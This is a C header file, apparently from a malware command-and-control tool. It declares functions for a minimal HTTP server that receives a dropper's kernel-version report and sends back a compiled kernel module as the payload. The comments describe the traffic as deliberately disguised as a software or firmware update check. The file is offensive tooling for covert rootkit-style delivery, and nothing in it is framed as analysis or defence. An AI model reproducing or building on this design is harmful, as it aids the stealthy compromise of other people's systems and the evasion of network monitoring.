/**
 * @file http.h
 * @brief HTTP covert delivery — C2 acts as a minimal HTTP server.
 *
 * The dropper sends a POST /update with the kernel version in the body.
 * The C2 responds with the compiled .ko as an octet-stream body.
 * Traffic is disguised as a normal software update check.
 */

#ifndef HTTP_H
#define HTTP_H

#include <stdint.h>
#include <stddef.h>

/** Maximum size of an incoming HTTP request (bytes). */
#define HTTP_REQ_MAX  4096

/**
 * @brief Listen for one HTTP dropper request and deliver the payload.
 *
 * Binds to 0.0.0.0:port, accepts one connection, reads the POST body
 * (kernel version string), fills kver_out, then waits for the caller
 * to provide the payload path before sending the HTTP response.
 *
 * Returns the accepted socket so the caller can call http_send_payload()
 * on it after building the module.
 *
 * @param port      TCP port to listen on (typically 80 or 8080).
 * @param kver_out  Output buffer for the kernel version string.
 * @param kver_max  Size of kver_out in bytes.
 * @return          Connected socket fd on success, -1 on error.
 */
int http_wait_dropper(uint16_t port, char *kver_out, size_t kver_max);

/**
 * @brief Send the .ko payload as an HTTP 200 response.
 *
 * Writes the HTTP response headers followed by the binary payload.
 * The Content-Type is set to application/octet-stream and the response
 * is disguised as a firmware update package.
 *
 * @param sock     Connected socket returned by http_wait_dropper().
 * @param ko_path  Path to the compiled .ko file to send.
 * @return         0 on success, -1 on error.
 */
int http_send_payload(int sock, const char *ko_path);

#endif /* HTTP_H */
